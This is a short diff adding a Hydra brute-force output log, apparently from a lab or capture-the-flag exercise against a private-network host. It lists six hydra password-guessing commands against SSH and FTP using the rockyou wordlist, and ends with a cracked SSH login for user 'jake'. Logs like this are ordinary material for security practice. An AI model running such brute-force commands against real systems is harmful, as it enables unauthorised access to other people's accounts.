@@ -1,0 +1,7 @@
+# Hydra v9.6 run at 2026-05-22 00:46:44 on 10.49.188.5 ssh (hydra -L user_name.txt -P /usr/share/wordlists/rockyou.txt -t 4 -o BruteForce.txt -f 10.49.188.5 ssh)
+# Hydra v9.6 run at 2026-05-22 00:52:57 on 10.49.188.5 ftp (hydra -L user_name.txt -P /usr/share/wordlists/rockyou.txt -t 20 -o BruteForce.txt -f 10.49.188.5 ftp)
+# Hydra v9.6 run at 2026-05-22 00:53:53 on 10.49.188.5 ftp (hydra -l jake -P /usr/share/wordlists/rockyou.txt -t 20 -o BruteForce.txt -f 10.49.188.5 ftp)
+# Hydra v9.6 run at 2026-05-22 00:55:11 on 10.49.188.5 ftp (hydra -l Jake -P /usr/share/wordlists/rockyou.txt -t 20 -o BruteForce.txt -f 10.49.188.5 ftp)
+# Hydra v9.6 run at 2026-05-22 00:55:26 on 10.49.188.5 ssh (hydra -l Jake -P /usr/share/wordlists/rockyou.txt -t 4 -o BruteForce.txt -f 10.49.188.5 ssh)
+# Hydra v9.6 run at 2026-05-22 01:04:19 on 10.49.188.5 ssh (hydra -l jake -P /usr/share/wordlists/rockyou.txt -t 4 -o BruteForce.txt -f 10.49.188.5 ssh)
+[22][ssh] host: 10.49.188.5   login: jake   password: 987654321
